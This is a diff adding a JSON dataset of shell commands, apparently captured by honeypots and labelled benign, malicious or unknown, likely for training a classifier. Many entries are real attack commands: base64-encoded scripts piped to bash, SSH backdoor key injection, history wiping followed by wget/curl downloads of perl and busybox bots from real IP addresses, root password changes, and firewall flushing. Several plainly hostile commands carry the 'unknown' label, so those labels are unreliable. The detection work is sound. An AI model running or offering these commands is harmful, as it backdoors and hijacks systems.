@@ -1,0 +1,318 @@
+[
+  {
+    "input": "uname -a",
+    "label": "benign"
+  },
+  {
+    "input": "uname",
+    "label": "benign"
+  },
+  {
+    "input": "uname -m",
+    "label": "benign"
+  },
+  {
+    "input": "top",
+    "label": "benign"
+  },
+  {
+    "input": "LC_ALL=C top -bn1",
+    "label": "benign"
+  },
+  {
+    "input": "crontab -l",
+    "label": "benign"
+  },
+  {
+    "input": "LC_ALL=C crontab -l",
+    "label": "benign"
+  },
+  {
+    "input": "cat /proc/cpuinfo | grep name | wc -l",
+    "label": "benign"
+  },
+  {
+    "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
+    "label": "benign"
+  },
+  {
+    "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+    "label": "benign"
+  },
+  {
+    "input": "w",
+    "label": "benign"
+  },
+  {
+    "input": "ls -lh $(which ls)",
+    "label": "benign"
+  },
+  {
+    "input": "lscpu | grep Model",
+    "label": "benign"
+  },
+  {
+    "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
+    "label": "benign"
+  },
+  {
+    "input": "which ls",
+    "label": "benign"
+  },
+  {
+    "input": "free -m",
+    "label": "benign"
+  },
+  {
+    "input": "ps -x",
+    "label": "benign"
+  },
+  {
+    "input": "ps -ef | grep '[Mm]iner'",
+    "label": "benign"
+  },
+  {
+    "input": "ps | grep '[Mm]iner'",
+    "label": "benign"
+  },
+  {
+    "input": "dmidecode|grep Vendor|head -n 1",
+    "label": "benign"
+  },
+  {
+    "input": "dmesg | grep irtual",
+    "label": "benign"
+  },
+  {
+    "input": "lspci | grep irti",
+    "label": "benign"
+  },
+  {
+    "input": "ifconfig",
+    "label": "benign"
+  },
+  {
+    "input": "nproc",
+    "label": "benign"
+  },
+  {
+    "input": "/ip cloud print",
+    "label": "benign"
+  },
+  {
+    "input": "echo Hi | cat -n",
+    "label": "benign"
+  },
+  {
+    "input": "cat /proc/cpuinfo",
+    "label": "benign"
+  },
+  {
+    "input": "sleep 15s && cd /var/tmp; echo \"IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKcm0gLXJmIC5YMTctdW5peApta2RpciAuWDE3LXVuaXgKY2QgLlgxNy11bml4Cm12IC92YXIvdG1wL2RvdGEudGFyLmd6IGRvdGEudGFyLmd6CnRhciB4ZiBkb3RhLnRhci5negpzbGVlcCAzcyAmJiBjZCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYwpub2h1cCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYy90c20gLXQgMTUwIC1TIDYgLXMgNiAtcCAyMiAtUCAwIC1mIDAgLWsgMSAtbCAxIC1pIDAgL3RtcC91cC50eHQgMTkyLjE2OCA+PiAvZGV2L251bGwgMj4xJgpzbGVlcCA4bSAmJiBub2h1cCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYy90c20gLXQgMTUwIC1TIDYgLXMgNiAtcCAyMiAtUCAwIC1mIDAgLWsgMSAtbCAxIC1pIDAgL3RtcC91cC50eHQgMTcyLjE2ID4+IC9kZXYvbnVsbCAyPjEmCnNsZWVwIDIwbSAmJiBjZCAuLjsgL3RtcC8uWDE3LXVuaXgvLnJzeW5jL2luaXRhbGwgMj4xJgpleGl0IDA=\" | base64 --decode | bash",
+    "label": "malicious"
+  },
+  {
+    "input": "sleep 15s && cd /var/tmp; echo \"IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKcm0gLXJmIC5YMTctdW5peApybSAtcmYgLlgxOS11bml4Cm1rZGlyIC5YMTktdW5peApjZCAuWDE5LXVuaXgKbXYgL3Zhci90bXAvZG90YTMudGFyLmd6IGRvdGEzLnRhci5negp0YXIgeGYgZG90YTMudGFyLmd6CnNsZWVwIDNzICYmIGNkIC90bXAvLlgxOS11bml4Ly5yc3luYy9jCm5vaHVwIC90bXAvLlgxOS11bml4Ly5yc3luYy9jL3RzbSAtdCAxNTAgLVMgNiAtcyA2IC1wIDIyIC1QIDAgLWYgMCAtayAxIC1sIDEgLWkgMCAvdG1wL3VwLnR4dCAxOTIuMTY4ID4+IC9kZXYvbnVsbCAyPjEmCnNsZWVwIDhtICYmIG5vaHVwIC90bXAvLlgxOS11bml4Ly5yc3luYy9jL3RzbSAtdCAxNTAgLVMgNiAtcyA2IC1wIDIyIC1QIDAgLWYgMCAtayAxIC1sIDEgLWkgMCAvdG1wL3VwLnR4dCAxNzIuMTYgPj4gL2Rldi9udWxsIDI+MSYKc2xlZXAgMjBtICYmIGNkIC4uOyAvdG1wLy5YMTktdW5peC8ucnN5bmMvaW5pdGFsbCAyPjEmCmV4aXQgMA==\" | base64 --decode | bash",
+    "label": "malicious"
+  },
+  {
+    "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+    "label": "malicious"
+  },
+  {
+    "input": "uname -a;unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH;history -n;export HISTFILE=/dev/null;export HISTSIZE=0;export HISTFILESIZE=0;cd /var/tmp;cd /tmp;rm -rf kik.pl;wget -q 128.199.224.178/wp-admin/images/kik.pl || curl -s -O -f 128.199.224.178/wp-admin/images/kik.pl;perl kik.pl;rm -rf kik.pl",
+    "label": "malicious"
+  },
+  {
+    "input": "uname -a;unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH;history -n;export HISTFILE=/dev/null;export HISTSIZE=0;export HISTFILESIZE=0;cd /var/tmp;cd /tmp;rm -rf zyk;wget -q 203.146.208.208/drago/images/.ssh/.ssh/zyk || curl -s -O -f 203.146.208.208/drago/images/.ssh/.ssh/zyk;perl zyk;rm -rf zyk",
+    "label": "malicious"
+  },
+  {
+    "input": "uname -a;unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH;history -n;export HISTFILE=/dev/null;export HISTSIZE=0;export HISTFILESIZE=0;cd;mkdir .ssh;cat .ssh/authorized_keys|grep -v 'heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >>.ssh/.auth_k;echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAvN5GkpS25Z9eA2bARaXTVfVN2m/N5V5ddOTyVPftA3ljorQitmh1pyuZDty9oTWF+J0cOtGBvRaQ7NvZCaDC2q6QR0iMOfq7zs+4bl8WO8UnaQcVVIBeEt3YPo8PXwVm5fR4wgoq9SZp29/2jFz0UmAOhiUyImh9/P7jFWqpv3gSxZ8neq+4pSCUfE24OGiFBpJGkAE+wMmJcBX0WjFfjedcbBs1FO/C+x8WY9bFkQ3NwwjVbh3c3mYy9zqdPhm6GI/heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >> .ssh/.auth_k;mv .ssh/.auth_k .ssh/authorized_keys;cd",
+    "label": "malicious"
+  },
+  {
+    "input": "uname -a;unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH;history -n;export HISTFILE=/dev/null;export HISTSIZE=0;export HISTFILESIZE=0;cd /var/tmp;cd /tmp;rm -rf zyk;wget -q --timeout=15 --tries=2 203.146.208.208/drago/images/.ssh/.ssh/zyk || curl --connect-timeout 15 -s -O -f 203.146.208.208/drago/images/.ssh/.ssh/zyk;perl zyk;rm -rf zyk .a;cd /tmp;",
+    "label": "malicious"
+  },
+  {
+    "input": "uname -a;unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH;history -n;export HISTFILE=/dev/null;export HISTSIZE=0;export HISTFILESIZE=0;cd /var/tmp;cd /tmp;rm -rf zyk;wget -q --timeout=30 --tries=2 203.146.208.208/drago/images/.ssh/.ssh/zyk || curl --connect-timeout 15 -s -O -f 203.146.208.208/drago/images/.ssh/.ssh/zyk;perl zyk;rm -rf zyk .a;cd /tmp;",
+    "label": "malicious"
+  },
+  {
+    "input": "echo \"321\" > /var/tmp/.var03522123",
+    "label": "unknown"
+  },
+  {
+    "input": "rm -rf /var/tmp/.var03522123",
+    "label": "unknown"
+  },
+  {
+    "input": "cat /var/tmp/.var03522123 | head -n 1",
+    "label": "unknown"
+  },
+  {
+    "input": "echo -e \"admin2016\\nTZ8LEbdfVG2s\\nTZ8LEbdfVG2s\"|passwd|bash",
+    "label": "unknown"
+  },
+  {
+    "input": "echo \"!@#$abcd,\\njYQthZBnEutt\\njYQthZBnEutt\\n\"|passwd",
+    "label": "unknown"
+  },
+  {
+    "input": "echo \"root:BNwfBgTcnNyj\"|chpasswd|bash",
+    "label": "unknown"
+  },
+  {
+    "input": ">/tmp/t && cd /tmp/ && >retrieve; >.t",
+    "label": "unknown"
+  },
+  {
+    "input": "sh",
+    "label": "unknown"
+  },
+  {
+    "input": "shell",
+    "label": "unknown"
+  },
+  {
+    "input": "/bin/busybox SATORI",
+    "label": "unknown"
+  },
+  {
+    "input": "enable",
+    "label": "unknown"
+  },
+  {
+    "input": "system",
+    "label": "unknown"
+  },
+  {
+    "input": "cat /proc/mounts; /bin/busybox WTZBU",
+    "label": "unknown"
+  },
+  {
+    "input": "cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox TYIUG",
+    "label": "unknown"
+  },
+  {
+    "input": "tftp; wget; /bin/busybox RVSOU",
+    "label": "unknown"
+  },
+  {
+    "input": "dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s",
+    "label": "unknown"
+  },
+  {
+    "input": "rm .s; exit",
+    "label": "unknown"
+  },
+  {
+    "input": "/bin/busybox cp /bin/busybox retrieve && >retrieve && /bin/busybox chmod 777 retrieve && /bin/busybox cp /bin/busybox .t && >.t && /bin/busybox chmod 777 .t",
+    "label": "unknown"
+  },
+  {
+    "input": "",
+    "label": "unknown"
+  },
+  {
+    "input": "ping ; sh",
+    "label": "unknown"
+  },
+  {
+    "input": "iptables -F",
+    "label": "unknown"
+  },
+  {
+    "input": "LC_ALL=C passwd test1",
+    "label": "unknown"
+  },
+  {
+    "input": "cd /tmp; /bin/busybox wget http://23.254.230.38/p3n1s.sh -O - > jeSjax; /bin/busybox chmod 777 jeSjax; sh /tmp/jeSjax",
+    "label": "unknown"
+  },
+  {
+    "input": "scp -t ~/.dhpcd",
+    "label": "unknown"
+  },
+  {
+    "input": "  echo -e '\\x47\\x72\\x6f\\x70/' > //.nippon;   cat //.nippon;   rm -f //.nippon",
+    "label": "unknown"
+  },
+  {
+    "input": "ls -al /tmp/foo;",
+    "label": "unknown"
+  },
+  {
+    "input": "/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1",
+    "label": "unknown"
+  },
+  {
+    "input": "LC_ALL=C chattr -i -a ~/.dhpcd",
+    "label": "unknown"
+  },
+  {
+    "input": "/bin/busybox wget; /bin/busybox tftp; /bin/busybox SATORI",
+    "label": "unknown"
+  },
+  {
+    "input": "/bin/busybox wget http://5.206.227.65/fbot.x86_64 -O -> .t; /bin/busybox chmod 777 .t; ./.t wget; >.t",
+    "label": "unknown"
+  },
+  {
+    "input": "killall -9 perl;cd /var/tmp/ ; cd /tmp/ ; rm -rf ssh1.txt ; wget http://185.234.217.21/ssh1.txt ; mv ssh1.txt wget.txt ; perl wget.txt 193.169.254.11; lwp-download http://185.234.217.21/ssh1.txt ; mv ssh1.txt lynx.txt ; perl lynx.txt 193.169.254.11;fetch http://185.234.217.21/ssh1.txt ; mv ssh1.txt fetch.txt ; perl fetch.txt 193.169.254.11; curl -O http://185.234.217.21/ssh1.txt ; mv ssh1.txt curl.txt ; perl curl.txt 193.169.254.11 ; rm -rf ssh1.txt wget.txt lynx.txt fetch.txt curl.txt",
+    "label": "unknown"
+  },
+  {
+    "input": "cd /tmp; wget google.com",
+    "label": "unknown"
+  },
+  {
+    "input": "rm /tmp/foo; touch /tmp/foo;",
+    "label": "unknown"
+  },
+  {
+    "input": "LC_ALL=C grep \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuhPmv3xdhU7JbMoc/ecBTDxiGqFNKbe564p4aNT6JbYWjNwZ5z6E4iQQDQ0bEp7uBtB0aut0apqDF/SL7pN5ybh2X44aCwDaSEB6bJuJi0yMkZwIvenmtCA1LMAr2XifvGS/Ulac7Qh5vFzfw562cWC+IOI+LyQZAcPgr+CXphJhm8QQ+O454ItXurQX6oPlA2rNfF36fnxYss1ZvUYC80wWTi9k2+/XR3IoQXZHKCFsJiwyKO2CY+jShBbDBbtdOX3/ksHNVNStA/jPE0HYD7u6V2Efjv9K+AEbklMsytD9T60Iu3ua+ugBrP5hL7zAjPHpXH8qW4Ku7dySZ4yvH\" ~/.ssh/authorized_keys",
+    "label": "unknown"
+  },
+  {
+    "input": "LC_ALL=C ~/.dhpcd",
+    "label": "unknown"
+  },
+  {
+    "input": "LC_ALL=C /tmp/knrm",
+    "label": "unknown"
+  },
+  {
+    "input": "top -bn1",
+    "label": "benign"
+  },
+  {
+    "input": "cat /proc/version",
+    "label": "benign"
+  },
+  {
+    "input": "free",
+    "label": "benign"
+  },
+  {
+    "input": "free -mt",
+    "label": "benign"
+  },
+  {
+    "input": "ps",
+    "label": "benign"
+  },
+  {
+    "input": "ps x",
+    "label": "benign"
+  },
+  {
+    "input": "ifconfig -a",
+    "label": "benign"
+  },
+  {
+    "input": "/sbin/ifconfig",
+    "label": "benign"
+  }
+]
